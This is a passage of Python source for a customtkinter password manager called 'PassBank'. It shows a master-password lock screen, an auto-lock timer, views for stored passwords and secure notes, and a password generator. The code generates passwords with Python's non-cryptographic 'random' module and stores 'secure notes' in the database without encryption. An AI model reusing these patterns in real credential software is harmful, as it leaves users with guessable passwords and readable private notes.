                        master_password_page = customtkinter.CTkFrame(root, width=400, height=480)
                        master_password_page.place(relx=0.5, rely=0.5, anchor="center")
                        master_password_page.propagate(False)

                        customtkinter.CTkLabel(master_password_page, text="Enter Master Password", font=customtkinter.CTkFont(family="Rem", size=25)).pack(pady=(90,0), padx=20)

                        user_details_frame = customtkinter.CTkFrame(master_password_page, width=280, height=38, corner_radius=50, border_color="#54585F", border_width=2, cursor="hand2")
                        user_details_frame.pack(pady=(33, 30))
                        user_details_frame.propagate(False) 
                        user_details_frame.bind("<Button-1>", remove_logout)
                        
                        with open(os.path.join(folder_path, "smaller-temp-profile.png"), "wb") as f:
                            f.write(requests.get(f"https://ui-avatars.com/api/?rounded=true&name={user['displayName']}&&size=34").content)      
                        
                        profile_image = customtkinter.CTkLabel(user_details_frame, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\smaller-temp-profile.png"))
                        profile_image.pack(side="left", padx=(6,10), pady=(0,1))    
                        profile_image.bind("<Button-1>", remove_logout)
                        
                        email_label = customtkinter.CTkLabel(user_details_frame, text=user['email'], font=customtkinter.CTkFont(family="Rem", size=15))
                        email_label.pack(padx=(0,0), side="left") 
                        email_label.bind("<Button-1>", remove_logout)

                        down_image = customtkinter.CTkLabel(user_details_frame, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\down.png"))
                        down_image.pack(anchor="e", padx=15,pady=(12,0))   
                        user_details_frame.bind("<Button-1>", remove_logout)

                        master_password_alerts = customtkinter.CTkLabel(master_password_page, text="Incorrect Master Password",font=customtkinter.CTkFont(family="Roboto", size=13), text_color="#d42f2f")

                        master_password_entry = customtkinter.CTkEntry(master_password_page, placeholder_text='Master Password', width=280, height=46, show="●")
                        master_password_entry.pack(pady=20, padx=20)
                        master_password_entry.bind("<Return>", final_check)
                        master_password_entry.focus_set()

                        check = customtkinter.CTkButton(master_password_page, text="Unlock PassBank", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280)
                        check.pack(pady=(15,30), padx=20)
                        check.bind("<Button-1>", final_check)

                        forgot_master_password = customtkinter.CTkLabel(master_password_page, text="Forgot Master Password?", font=customtkinter.CTkFont(family="Rem", size=15),text_color="#306896", cursor="hand2")
                        forgot_master_password.pack(pady=(50,20))
                        
                        root.unbind('<FocusOut>', on_focus_out)
                        root.unbind('<FocusIn>', on_focus_in)

                    def timer_function(seconds):
                        global timer
                        global focus_in

                        for i in range(seconds):
                            if focus_in:
                                timer = 0
                                return

                            sleep(1)
                            timer += 1
                        
                        timer = 0
                        lock_app()

                    if timer == "5 minutes":
                        timer_thread = threading.Thread(target=timer_function, args=(300,))
                        timer_thread.start()
                        root.bind("<FocusIn>", on_focus_in)

                    if timer == "15 minutes":
                        timer_thread = threading.Thread(target=timer_function, args=(900,))
                        timer_thread.start()
                        root.bind("<FocusIn>", on_focus_in)

                    if timer == "30 minutes":
                        timer_thread = threading.Thread(target=timer_function, args=(1800,))
                        timer_thread.start()
                        root.bind("<FocusIn>", on_focus_in)

                    if timer == "45 minutes":
                        timer_thread = threading.Thread(target=timer_function, args=(2700,))
                        timer_thread.start()
                        root.bind("<FocusIn>", on_focus_in)
                    
                    if timer == "1 hour":
                        timer_thread = threading.Thread(target=timer_function, args=(3600,))
                        timer_thread.start()
                        root.bind("<FocusIn>", on_focus_in)

                    if timer == "2 hour":
                        timer_thread = threading.Thread(target=timer_function, args=(7200,))
                        timer_thread.start()
                        root.bind("<FocusIn>", on_focus_in)

                def open_password(event):
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    add_secure_notes_main_frame.place_forget()
                    generate_password_main_frame2.place_forget()
                    get_started_main_frame1.place_forget()
                    profile_settings_main_frame.place_forget()

                    password_main_frame.place(x=240,y=10)

                    add_password_frame1 = customtkinter.CTkFrame(password_main_frame, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=100)
                    add_password_frame1.place(relx=0.5, rely=0.1, anchor="center")
                    add_password_frame1.propagate(False)

                    customtkinter.CTkLabel(master=add_password_frame1, text="Passwords", font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold")).place(x=60,y=10)
                    customtkinter.CTkLabel(master=add_password_frame1, text="Title", font=customtkinter.CTkFont(family="Roboto", size=13)).place(x=61,y=55)

                    line = Frame(password_main_frame, bg='#4d4d4d', width=1100, height=1)
                    line.place(y=140, x=70)


                    add_password = customtkinter.CTkButton(master=add_password_frame1, text="Add a password",font=customtkinter.CTkFont(family="Roboto", size=15), height=40, width=90, corner_radius=50, fg_color="#0C888D", hover_color="#0BA1A2")
                    add_password.place(x=800, y=30)
                    add_password.bind("<Button-1>", lambda event, password_saved="": open_add_password(password_saved="", event=""))

                    add_password_frame2 = customtkinter.CTkScrollableFrame(password_main_frame, bg_color="#1A1A1A", fg_color="#1A1A1A", width=980, height=500)
                    add_password_frame2.place(relx=0.5, rely=0.58, anchor="center")

                    data = db.child("users").child(f"{auth.current_user['localId']}").child("passwords").get().val()

                    animated_frame = customtkinter.CTkFrame(root, width=780, height=700, corner_radius=0, fg_color="#282D34")
                    animated_frame.place(x=1400, y=0)
                    main_frame = customtkinter.CTkFrame(animated_frame, width=600, height=600, corner_radius=0, fg_color="#282D34")

                    def click_outside_frame(event):
                        animated_frame.place_forget()
                        
                    def trash(password_delete,event):
                        db.child("users").child(auth.current_user['localId']).child("passwords").child(password_delete).remove()
                        animated_frame.place_forget()
                        import time
                        time.sleep(0.4)
                        open_password(1)



                    def create_main_frame(title_text, username, password, website, color, encrypted_title):
                        '''
                        Here when a frame is clicked the frame's event is collected and the following username, title , password, colors and details are
                        passed
                        '''

                        frame1 = customtkinter.CTkFrame(main_frame, width=80, height=80, corner_radius=8, fg_color=color)
                        frame1.place(relx=0.5, rely=0.1, anchor="center")

                        def copy(event):
                            root.clipboard_clear()
                            root.clipboard_append(password)
                            copy_label.configure(text="Copied")

                        def on_hover(event):
                            copy_pass.place(x=520, y=35)

                        def on_leave(event):
                            copy_pass.place_forget()

                        def on_hover1(event):
                            copy_label.configure(text="Copy")
                            copy_pass.place(x=520, y=35)
                            copy_text_frame.place(x=517, y=5)

                        def on_leave1(event):
                            copy_text_frame.place_forget()
                            copy_pass.place_forget()

                        if len(title_text) == 1:
                            customtkinter.CTkLabel(master=frame1, text=a[:1], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")
                        else:
                            customtkinter.CTkLabel(master=frame1, text=a[:2], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")

                        title1 = customtkinter.CTkLabel(main_frame, text=title_text, font=customtkinter.CTkFont(family="Roboto", size=18))
                        title1.place(relx=0.5, rely=0.21, anchor="center")

                        details_frame = customtkinter.CTkFrame(main_frame, width=600, height=300, fg_color="#383C43")
                        details_frame.place(relx=0.5, rely=0.6, anchor="center")
                        details_frame.propagate(False)

                        email_frame = customtkinter.CTkFrame(details_frame, width=600, height=100, corner_radius=0, fg_color="#383C43", bg_color="#383C43")
                        email_frame.pack(pady=(10,0))
                        email_frame.propagate(False)

                        password_frame = customtkinter.CTkFrame(details_frame, width=600, height=100, corner_radius=0, fg_color="#383C43", bg_color="#383C43", border_color="#3E4249", border_width=2)
                        password_frame.pack()
                        password_frame.propagate(False)

                        copy_text_frame = customtkinter.CTkFrame(password_frame, width=50, height=30, fg_color="#383C43",corner_radius=10)
                        copy_text_frame.propagate(False)
                        
                        copy_text_frame_inner = customtkinter.CTkFrame(copy_text_frame, fg_color="#282D34",corner_radius=8)
                        copy_text_frame_inner.pack(fill='both', expand=True)

                        copy_label = customtkinter.CTkLabel(copy_text_frame_inner, text="Copy")
                        copy_label.pack()

                        website_frame = customtkinter.CTkFrame(details_frame, width=600, height=100, corner_radius=0, fg_color="#383C43", bg_color="#383C43")
                        website_frame.pack(pady=(0,10))
                        website_frame.propagate(False)

                        email_label = customtkinter.CTkLabel(email_frame, text="Email or Username", font=customtkinter.CTkFont(family="Roboto", size=18))
                        email_label.pack(anchor="w", pady=40, padx=20)

                        email = customtkinter.CTkLabel(email_frame, text=username, font=customtkinter.CTkFont(family="Roboto", size=18))
                        email.place(x=200, y=35)

                        password_label = customtkinter.CTkLabel(password_frame, text="Password", font=customtkinter.CTkFont(family="Roboto", size=18))
                        password_label.pack(anchor="w", pady=40, padx=20)
                        password_label.bind("<Leave>", on_leave)

                        copy_pass = customtkinter.CTkLabel(master=password_frame, text="",image=PhotoImage(file=folder_path+r"\copy_pass.png"), font=customtkinter.CTkFont(family="Roboto", size=20),cursor="hand2")
                        copy_pass.bind("<Button-1>", copy)

                        copy_pass.bind("<Enter>", on_hover1)
                        copy_pass.bind("<Leave>", on_leave1)

                        password_frame.bind("<Enter>", on_hover)
                        password_frame.bind("<Leave>", on_leave)

                        password_length = len(password)

                        if password_length >= 9:
                            password_text = customtkinter.CTkLabel(password_frame, text=16*"●", font=customtkinter.CTkFont(family="Roboto", size=18))
                        else:
                            password_text = customtkinter.CTkLabel(password_frame, text=password_length*"●", font=customtkinter.CTkFont(family="Roboto", size=18))

                        password_text.place(x=200, y=35)

                        password_text.bind("<Enter>", on_hover)
                        password_text.bind("<Leave>", on_leave)
                        
                        website_label = customtkinter.CTkLabel(website_frame, text="Website", font=customtkinter.CTkFont(family="Roboto", size=18))
                        website_label.pack(anchor="w", pady=30, padx=20)

                        website = customtkinter.CTkLabel(website_frame, text="https://www."+ website, font=customtkinter.CTkFont(family="Roboto", size=18))
                        website.place(x=200, y=25)

                        trash_frame = customtkinter.CTkFrame(main_frame, width=160, height=80, corner_radius=8, fg_color="#383C43", cursor="hand2")
                        trash_frame.place(relx=0.38, rely=0.86)
                        trash_frame.propagate(False)
                        trash_frame.bind("<Button-1>", lambda e, password_delete=encrypted_title: trash(password_delete,event=e))

                        trash_image = customtkinter.CTkLabel(master=trash_frame, text="",image=PhotoImage(file=folder_path+r"\delete.png"), font=customtkinter.CTkFont(family="Roboto", size=20))
                        trash_image.place(relx=0.41, rely=0.2)
                        trash_image.bind("<Button-1>", lambda e, password_delete=encrypted_title: trash(password_delete,event=e))
                        
                        trash_label = customtkinter.CTkLabel(master=trash_frame, text="Trash", font=customtkinter.CTkFont(family="Roboto", size=15))
                        trash_label.place(relx=0.38, rely=0.55)
                        trash_label.bind("<Button-1>", lambda e, password_delete=encrypted_title: trash(password_delete,event=e))

                        close = customtkinter.CTkLabel(master=animated_frame, text="",image=PhotoImage(file=folder_path+r"\circle.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                        close.place(x=20, y=20)
                        close.bind("<Button-1>", click_outside_frame)

                    def animate_frame(x):
                        if x >= 500:
                            animated_frame.place(x=x, y=0)
                            delay = 1  
                            root.after(delay, animate_frame, x - 7) 
                            main_frame.place(relx=0.5, rely=0.5, anchor="center")

                    def frame_click(event, title, username, password, website,color, encrypted_title):
                        create_main_frame(title, username, password, website, color, encrypted_title)
                        animate_frame(1400)

                    try:
                        for service, service_info in data.items():
                            '''
                            Random colors are selected from the boxes to give them a unique color, and the rest of the code is taking data from the database
                            which are encrypted are decrpyting and are added to their respective frames
                            '''

                            colors = ["#000080", "#4B0082", "#008080", "#990000", "#355E3B", "#636363", "#9370DB", "#C04000", "#8A9A5B"]
                            random_color = random.choice(colors)
                            
                            title = cipher_suite.decrypt(service_info['title']).decode()
                            username = cipher_suite.decrypt(service_info['username']).decode()
                            password = cipher_suite.decrypt(service_info['password']).decode()
                            website = cipher_suite.decrypt(service_info['website']).decode()

                            frame = customtkinter.CTkFrame(master=add_password_frame2, cursor="hand2")
                            frame.pack(fill="x", pady=10, padx=(50,60))
                            frame.configure(height=100)
                            frame.propagate(False)

                            icon_frame = customtkinter.CTkFrame(master=frame, width=70, height=70, fg_color=random_color)
                            icon_frame.pack(pady=10, padx=20, anchor="w")

                            title_label = customtkinter.CTkLabel(master=frame, text=title, font=customtkinter.CTkFont(family="Roboto", size=18))
                            title_label.place(x=110, y=20)

                            title_label1 = customtkinter.CTkLabel(master=frame, text=username, font=customtkinter.CTkFont(family="Roboto", size=12), text_color="#95979C")
                            title_label1.place(x=113, y=45)

                            frame.bind("<Button-1>", lambda event,color=icon_frame.cget('fg_color'), title=title, username=username, password=password, website=website, encrypted_title=service_info['title']: frame_click(event, title, username, password, website,color, encrypted_title))
                            title_label.bind("<Button-1>", lambda event,color=icon_frame.cget('fg_color'), title=title, username=username, password=password, website=website, encrypted_title=service_info['title']: frame_click(event, title, username, password, website,color, encrypted_title))
                            title_label1.bind("<Button-1>", lambda event,color=icon_frame.cget('fg_color'), title=title, username=username, password=password, website=website, encrypted_title=service_info['title']: frame_click(event, title, username, password, website,color, encrypted_title))
                            icon_frame.bind("<Button-1>", lambda event,color=icon_frame.cget('fg_color'), title=title, username=username, password=password, website=website, encrypted_title=service_info['title']: frame_click(event, title, username, password, website,color, encrypted_title))

                            a = title
                            if len(a) == 1:
                                customtkinter.CTkLabel(master=icon_frame, text=a[:1], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")
                            else:
                                customtkinter.CTkLabel(master=icon_frame, text=a[:2], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")
                    
                    except:
                        image_frame  = customtkinter.CTkFrame(add_password_frame2, width=500, height=500, fg_color="#1A1A1A", bg_color="#1A1A1A")
                        image_frame.pack()

                        customtkinter.CTkLabel(master=add_password_frame2, text="",image=PhotoImage(file=folder_path+r"\box.png")).place(relx=0.35, rely=0.2)
                        customtkinter.CTkLabel(master=add_password_frame2, text="Try adding a password",text_color="#838383", font=customtkinter.CTkFont(family="Rem", size=20)).place(relx=0.37, rely=0.75)

                def open_secure_note(event):
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    add_secure_notes_main_frame.place_forget()
                    generate_password_main_frame2.place_forget()
                    get_started_main_frame1.place_forget()
                    profile_settings_main_frame.place_forget()

                    password_main_frame.place(x=240,y=10)

                    add_password_frame1 = customtkinter.CTkFrame(password_main_frame, bg_color="#1A1A1A", fg_color="#1A1A1A", width=1000, height=100)
                    add_password_frame1.place(relx=0.5, rely=0.1, anchor="center")
                    add_password_frame1.propagate(False)

                    customtkinter.CTkLabel(master=add_password_frame1, text="Secure Notes", font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold")).place(x=60,y=10)
                    customtkinter.CTkLabel(master=add_password_frame1, text="Title", font=customtkinter.CTkFont(family="Roboto", size=13)).place(x=61,y=55)
                    
                    line = Frame(password_main_frame, bg='#4d4d4d', width=1100, height=1)
                    line.place(y=140, x=70)

                    add_password = customtkinter.CTkButton(master=add_password_frame1, text="Add Secure Note",font=customtkinter.CTkFont(family="Roboto", size=15), height=40, width=90, corner_radius=50, fg_color="#0C888D", hover_color="#0BA1A2")
                    add_password.place(x=800, y=30)
                    add_password.bind("<Button-1>", open_add_secure_note)

                    def animate_frame(x):
                        if x >= 500:
                            animated_frame.place(x=x, y=0)
                            delay = 1  
                            root.after(delay, animate_frame, x - 7) 
                            main_frame.place(relx=0.5, rely=0.5, anchor="center")

                    def frame_click(event, title_text, secure_note):
                        create_main_frame(title_text, secure_note)
                        animate_frame(1400)

                    def click_outside_frame():
                        animated_frame.place_forget()

                    def trash(secure_note_delete,event):
                        db.child("users").child(auth.current_user['localId']).child("secure notes").child(secure_note_delete).remove()
                        animated_frame.place_forget()
                        import time
                        time.sleep(0.4)
                        open_secure_note(1)

                    def create_main_frame(title_text, secure_note):            
                        frame1 = customtkinter.CTkFrame(main_frame, width=80, height=80, corner_radius=8)
                        frame1.place(relx=0.5, rely=0.1, anchor="center")

                        if len(title_text) == 1:
                            customtkinter.CTkLabel(master=frame1, text=title_text[:1], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")
                        else:
                            customtkinter.CTkLabel(master=frame1, text=title_text[:2], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")

                        title1 = customtkinter.CTkLabel(main_frame, text=title_text, font=customtkinter.CTkFont(family="Roboto", size=18))
                        title1.place(relx=0.5, rely=0.21, anchor="center")
                        details_frame = customtkinter.CTkFrame(main_frame, width=600, fg_color="#383C43")

                        lines = round(len(secure_note)/50) * 53

                        final = lines + 130

                        details_frame.configure(height=final)

                        details_frame.place(x=300, y=300, anchor="center")
                        details_frame.propagate(False)

                        email_frame = customtkinter.CTkFrame(details_frame, width=600, height=100, corner_radius=0, fg_color="#383C43", bg_color="#383C43")
                        email_frame.pack(pady=(10,0))
                        email_frame.propagate(False)

                        email = customtkinter.CTkLabel(email_frame, text=secure_note,wraplength=320,justify="left",anchor="w", font=customtkinter.CTkFont(family="Roboto", size=18))
                        email.place(x=180, y=35)

                        secure_label = customtkinter.CTkLabel(email_frame, text="Secure Note", font=customtkinter.CTkFont(family="Roboto", size=18))
                        secure_label.pack(anchor="w", pady=40, padx=20)

                        trash_frame = customtkinter.CTkFrame(main_frame, width=160, height=80, corner_radius=8, fg_color="#383C43", cursor="hand2")
                        trash_frame.place(relx=0.38, rely=0.86)
                        trash_frame.propagate(False)
                        trash_frame.bind("<Button-1>", lambda e, secure_note_delete=title_text: trash(secure_note_delete,event=e))

                        trash_image = customtkinter.CTkLabel(master=trash_frame, text="",image=PhotoImage(file=folder_path+r"\delete.png"), font=customtkinter.CTkFont(family="Roboto", size=20))
                        trash_image.place(relx=0.41, rely=0.2)
                        trash_image.bind("<Button-1>", lambda e, secure_note_delete=title_text: trash(secure_note_delete,event=e))
                        
                        trash_label = customtkinter.CTkLabel(master=trash_frame, text="Trash", font=customtkinter.CTkFont(family="Roboto", size=15))
                        trash_label.place(relx=0.38, rely=0.55)
                        trash_label.bind("<Button-1>", lambda e, secure_note_delete=title_text: trash(secure_note_delete,event=e))

                        def effectively(event):
                            click_outside_frame()
                            details_frame.destroy()

                        close = customtkinter.CTkLabel(master=animated_frame, text="",image=PhotoImage(file=folder_path+r"\circle.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                        close.place(x=20, y=20)
                        close.bind("<Button-1>", effectively)


                    animated_frame = customtkinter.CTkFrame(root, width=780, height=700, corner_radius=0, fg_color="#282D34")
                    animated_frame.place(x=1400, y=0)
                    main_frame = customtkinter.CTkFrame(animated_frame, width=600, height=600, corner_radius=0, fg_color="#282D34")

                    add_password_frame2 = customtkinter.CTkScrollableFrame(password_main_frame, bg_color="#1A1A1A", fg_color="#1A1A1A", width=980, height=500)
                    add_password_frame2.place(relx=0.5, rely=0.58, anchor="center")

                    data = db.child("users").child(f"{auth.current_user['localId']}").child("secure notes").get().val()

                    try:
                        for service, service_info in data.items():
                            frame = customtkinter.CTkFrame(master=add_password_frame2, cursor="hand2")
                            frame.pack(fill="x", pady=10, padx=(50,60))
                            frame.configure(height=100)
                            frame.propagate(False)

                            icon_frame = customtkinter.CTkFrame(master=frame, width=70, height=70, fg_color="#212121")
                            icon_frame.pack(pady=10, padx=10, anchor="w")

                            title_label = customtkinter.CTkLabel(master=frame, text=service_info['title'], font=customtkinter.CTkFont(family="Roboto", size=18))
                            title_label.place(x=90, y=30)

                            frame.bind("<Button-1>", lambda event, title=service_info['title'], secure_note = service_info['secure note']: frame_click(event, title_text=title, secure_note=secure_note ))


                            customtkinter.CTkLabel(master=icon_frame, text="",image=PhotoImage(file=folder_path+r"\notebook.png"), font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")
                    except:
                        image_frame  = customtkinter.CTkFrame(add_password_frame2, width=500, height=500, fg_color="#1A1A1A", bg_color="#1A1A1A")
                        image_frame.pack()

                        customtkinter.CTkLabel(master=add_password_frame2, text="",image=PhotoImage(file=folder_path+r"\box.png")).place(relx=0.35, rely=0.2)
                        customtkinter.CTkLabel(master=add_password_frame2, text="Try adding a secure note",text_color="#838383", font=customtkinter.CTkFont(family="Rem", size=20)).place(relx=0.37, rely=0.75)

                def open_add_secure_note(event):
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    generate_password_main_frame2.place_forget()
                    get_started_main_frame1.place_forget()
                    profile_settings_main_frame.place_forget()
                    
                    add_secure_notes_main_frame.place(x=240,y=10)
                    add_password_frame = customtkinter.CTkFrame(add_secure_notes_main_frame, bg_color="#1A1A1A", fg_color="#1A1A1A", width=500, height=600)
                    add_password_frame.place(relx=0.5, rely=0.5, anchor="center")



                    frame1 = customtkinter.CTkFrame(master=add_password_frame, width=70, height=70, fg_color="#1A1A1A")
                    frame1.pack(pady=(0,20))
                    frame1.propagate(False)

                    customtkinter.CTkLabel(master=frame1, text="",image=PhotoImage(file=folder_path+r"\notebook.png"), font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")
                    

                    def save_data(event):
                        title = title_entry.get()
                        secure_note_text = secure_note.get("1.0", "end-1c")
                        uid = auth.current_user['localId']

                        if title == "":
                            customtkinter.CTkLabel(master=add_password_frame, text='⚠ Please enter a title', font=customtkinter.CTkFont(family="Roboto", size=12), text_color="#F95D68").place(x=10, y=145)
                            if len(title) >= 1:
                                warning.pack(padx=10, anchor="w")
                        else:
                            db.child("users").child(f"{auth.current_user['localId']}").child("secure notes").child(f"{title}").update({"title": title,"secure note": secure_note_text})
                            open_secure_note(1)

                    title_entry = customtkinter.CTkEntry(master=add_password_frame, placeholder_text="Title*", font=customtkinter.CTkFont(family="Roboto", size=15), width=480, height=50 )
                    title_entry.pack(pady=2)

                    warning = customtkinter.CTkLabel(master=add_password_frame, text='*Required', font=customtkinter.CTkFont(family="Roboto", size=12))
                    warning.pack(padx=10, anchor="w")
                    
                    def on_focus_in(event):
                        if secure_note.get("1.0", "end-1c") == "Secure Note":
                            secure_note.delete("1.0", "end-1c")
                            secure_note.configure(text_color = "#D6D6D6")
                            
                    def on_focus_out(event):
                        if secure_note.get("1.0", "end-1c") == "":
                            secure_note.insert("1.0", "Secure Note")
                            secure_note.configure(text_color = "#899296")
                            
                    secure_note = customtkinter.CTkTextbox(add_password_frame, activate_scrollbars=True, font=customtkinter.CTkFont(family="Roboto", size=15), text_color="#899296", width=480, height=200, border_color="#565B5E", border_width=2)
                    secure_note.pack(pady=(50,10))
                    secure_note.insert("1.0", "Secure Note")

                    secure_note.bind("<FocusIn>", on_focus_in)
                    secure_note.bind("<FocusOut>", on_focus_out)
                    
                    save_button = customtkinter.CTkButton(master=add_password_frame, text="Save",font=customtkinter.CTkFont(family="Roboto", size=15), height=40, width=90, corner_radius=50, fg_color="#0C888D", hover_color="#0BA1A2")
                    save_button.pack()
                    save_button.bind("<Button-1>", save_data)

                def open_add_password(event, password_saved):
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    add_secure_notes_main_frame.place_forget()
                    generate_password_main_frame2.place_forget()
                    get_started_main_frame1.place_forget()
                    
                    add_password_main_frame.place(x=240,y=10)
                    add_password_frame = customtkinter.CTkFrame(add_password_main_frame, bg_color="#1A1A1A", fg_color="#1A1A1A", width=500, height=600)
                    add_password_frame.place(relx=0.5, rely=0.5, anchor="center")
                    colors = ["#000080", "#4B0082", "#008080", "#990000", "#355E3B", "#636363", "#9370DB", "#C04000", "#8A9A5B"]
                    random_color = random.choice(colors)
                    frame1 = customtkinter.CTkFrame(master=add_password_frame, width=70, height=70, fg_color=random_color)

                    def open_generate_password_new(event):
                        def destroy_image(event):
                            image_button.place_forget()
                            generate_password_frame.place_forget()

                        x, y = root.winfo_rootx(), root.winfo_rooty()
                        w, h = root.winfo_width(), root.winfo_height()
                        screenshot = ImageGrab.grab(bbox=(x, y, x + w, y + h))
                        blurred_screenshot = screenshot.filter(ImageFilter.GaussianBlur(radius=2))
                        blurred_screenshot.save(folder_path+r"\screenshot.png")

                        button_image = customtkinter.CTkImage(Image.open(folder_path+r"\screenshot.png"), size=(1280, 700))
                        image_button = customtkinter.CTkLabel(master=root, text="",image=button_image)
                        image_button.place(relx=0.5, rely=0.5, anchor="center")
                        image_button.bind("<Button-1>", destroy_image)
                        
                        generate_password_frame = customtkinter.CTkFrame(root, width=300, height=600, fg_color="#282D34", corner_radius=8)
                        generate_password_frame.place(relx=0.38, rely=0.5, anchor="center")
                        generate_password_frame.place(x=240,y=10)

                        def update_string(event):
                            random_password = password.cget("text")
                            password_1.delete(0, "end")
                            password_1.insert(0, random_password)
                            destroy_image(event=1)

                        def slider_event(value):
                            caps = switch_var1.get() == "on"
                            digits = switch_var2.get() == "on"
                            symbols = switch_var3.get() == "on"

                            def generate_random_password(length):
                                characters = string.ascii_lowercase
                                if digits:
                                    characters += string.digits
                                if symbols:
                                    characters += "@!$%&*"

                                if caps:
                                    characters += string.ascii_uppercase

                                if not characters:
                                    return "Select at least one option"

                                password = ''.join(random.choice(characters) for _ in range(length))
                                return password

                            random_password = generate_random_password(round(value))
                            password.configure(text=random_password)
                            length_display.configure(text=round(value))

                

                        top_header = customtkinter.CTkFrame(generate_password_frame, height=50, corner_radius=0, fg_color="#282D34")
                        top_header.pack(fill="x", padx=5, pady=(5,0))
                        top_header.propagate(False)

                        customtkinter.CTkLabel(master=top_header, text='Password Generator', font=customtkinter.CTkFont(family="Roboto", size=19, weight="bold")).place(relx=0.5, rely=0.5, anchor="center")


                        middle_body = customtkinter.CTkFrame(generate_password_frame, height=160, width=200, corner_radius=0, border_color="#383C43", border_width=1, fg_color="#151922")
                        middle_body.pack(fill="x")
                        middle_body.propagate(False)
                        middle_body.configure(width=350)

                        password = customtkinter.CTkLabel(master=middle_body, text='', wraplength=320,justify="left",anchor="w", font=customtkinter.CTkFont(family="Roboto", size=19, weight="bold"))
                        password.place(x=15,y=10)

                        fill_password = customtkinter.CTkButton(master=middle_body, text="Fill Password", width=200, font=customtkinter.CTkFont(family="Roboto", size=19))
                        fill_password.configure(corner_radius=50, height=30)
                        fill_password.place(relx=0.5, rely=0.8, anchor="center")
                        fill_password.bind("<Button-1>", update_string)

                        middle_lower_body = customtkinter.CTkFrame(generate_password_frame, height=80, corner_radius=0, fg_color="#282D34",border_color="#383C43", border_width=1)
                        middle_lower_body.pack(fill="x")
                        middle_lower_body.propagate(False)

                        customtkinter.CTkLabel(master=middle_lower_body, text='Length', font=customtkinter.CTkFont(family="Roboto", size=19)).place(x=40,y=25)

                        slider = customtkinter.CTkSlider(middle_lower_body, from_=8, to=60, width=130, command=slider_event)
                        slider.set(8)
                        slider.place(x=130,y=30)

                        length_display = customtkinter.CTkLabel(master=middle_lower_body, text='55', font=customtkinter.CTkFont(family="Roboto", size=19))
                        length_display.place(x=280,y=25)

                        lower_body = customtkinter.CTkFrame(generate_password_frame,height=160, corner_radius=0, fg_color="#282D34",border_color="#383C43", border_width=1)
                        lower_body.pack(fill="x", pady=(0,5))
                        lower_body.propagate(False)

                        customtkinter.CTkLabel(master=lower_body, text='Use Capital Letter (A-Z)', font=customtkinter.CTkFont(family="Roboto", size=15)).place(x=30,y=20)
                        switch_var1 = customtkinter.StringVar(value="on")
                        switch1 = customtkinter.CTkSwitch(lower_body, text="",variable=switch_var1, onvalue="on", offvalue="off")
                        switch1.place(x=260,y=20)

                        customtkinter.CTkLabel(master=lower_body, text='Use digits (0-9)', font=customtkinter.CTkFont(family="Roboto", size=15)).place(x=30,y=60)
                        switch_var2 = customtkinter.StringVar(value="on")
                        switch2 = customtkinter.CTkSwitch(lower_body, text="",variable=switch_var2, onvalue="on", offvalue="off")
                        switch2.place(x=260,y=60)

                        customtkinter.CTkLabel(master=lower_body, text='Use symbols (@!$%&*)', font=customtkinter.CTkFont(family="Roboto", size=15)).place(x=30,y=100)
                        switch_var3 = customtkinter.StringVar(value="on")
                        switch3 = customtkinter.CTkSwitch(lower_body, text="",variable=switch_var3, onvalue="on", offvalue="off")
                        switch3.place(x=260,y=100)   



                        password_main_frame.winfo_toplevel().lift(password_main_frame)

                        slider_event(8)

                    def on_entry_change(event):
                        a = title_entry.get()
                        if len(a) == 1:
                            customtkinter.CTkLabel(master=frame1, text=a[:1], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")
                        else:
                            customtkinter.CTkLabel(master=frame1, text=a[:2], font=customtkinter.CTkFont(family="Roboto", size=20)).place(relx=0.5, rely=0.5, anchor="center")

                    def save_data(event):
                        title = title_entry.get()
                        username = Email_Username_entry.get()
                        password =  password_1.get()
                        webiste_url = website_address_entry.get()
                        uid = auth.current_user['localId']

                        if title == "":
                            customtkinter.CTkLabel(master=add_password_frame, text='⚠ Please enter a title', font=customtkinter.CTkFont(family="Roboto", size=12), text_color="#F95D68").place(x=10, y=145)
                            if len(title) >= 1:
                                warning.pack(padx=10, anchor="w")
                        else:
                            encrypted_title = cipher_suite.encrypt(bytes(title, 'utf-8')).decode()
                            encrypted_username = cipher_suite.encrypt(bytes(username, 'utf-8')).decode()
                            encrypted_password = cipher_suite.encrypt(bytes(password, 'utf-8')).decode()
                            encrypted_website_url = cipher_suite.encrypt(bytes(webiste_url, 'utf-8')).decode()

                            db.child("users").child(f"{auth.current_user['localId']}").child("passwords").child(f"{encrypted_title}").update({"title": encrypted_title,"username": encrypted_username,"password": encrypted_password,"website": encrypted_website_url})
                            
                            open_password(event=1)

                    frame1.pack(pady=(0,20))
                    frame1.propagate(False)


                    title_entry = customtkinter.CTkEntry(master=add_password_frame,placeholder_text="Title*", font=customtkinter.CTkFont(family="Roboto", size=15), width=480, height=50 )
                    title_entry.pack(pady=2)
